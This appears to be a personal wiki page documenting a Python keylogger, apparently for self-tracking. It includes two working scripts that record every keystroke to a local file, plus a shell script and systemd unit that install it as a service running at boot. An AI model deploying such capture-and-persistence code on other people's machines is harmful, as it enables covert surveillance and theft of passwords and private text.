``` python    
#!/bin/python3
from pynput import keyboard
import logging
import os
import socket

# log_dir = os.environ['quantized_self_dir']
log_dir = "/home/paul/Documents/Software/keylogger"
os.makedirs(log_dir)
logging.basicConfig(filename = log_dir + "/{}keyLog.txt".format(str(socket.gethostname())), 
    level=logging.DEBUG, format='%(asctime)s: %(message)s')


def get_key_name(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def on_press(key):
    key_name = get_key_name(key)
    logging.info('Key {} pressed.'.format(key_name))
    print(key_name)

def on_release(key):
    key_name = get_key_name(key)
    logging.info('Key {} released.'.format(key_name))

with keyboard.Listener(
    on_press = on_press,
    on_release = on_release) as listener:
    listener.join()
```

## Previous Tries

``` python

# keylogger.py
import keyboard # for keylogs
from datetime import datetime

# https://www.thepythoncode.com/article/write-a-keylogger-python
# https://github.com/boppreh/keyboard#keyboard.hook

class Keylogger:
    def callback_pressed(self, event):
        # print(event.name)
        # print(event.event_type)
        with open(f"./test-keylog.txt", "a") as f:
            event_string = str(datetime.now().isoformat()) + " " + event.event_type + " "+  event.name
            print(event_string, file=f)
    def start(self):
        keyboard.hook(callback=self.callback_pressed)
        keyboard.wait()
if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
```

## install.sh

``` bash
#!/bin/bash
sudo cp keylogger.service /etc/systemd/system/keylogger.service
sudo systemctl enable keylogger.service
sudo systemctl start keylogger.service
```

``` service
# keylogger.service
[Unit]
Description=Keylogger Service
After=multi-user.target

[Service]
ExecStart=/usr/bin/python3 /home/dentropy/Software/keylogger/keylogger.py /home/dentropy/Software/keylogger/keylogger.out

[Install]
WantedBy=multi-user.target
```

## Links

* [wiki.software.Catagories.Keylogger](.md)

## Sources

* [https://www.tutorialspoint.com/design-a-keylogger-in-python](https://www.tutorialspoint.com/design-a-keylogger-in-python) [https://realpython.com/python-logging/](https://realpython.com/python-logging/)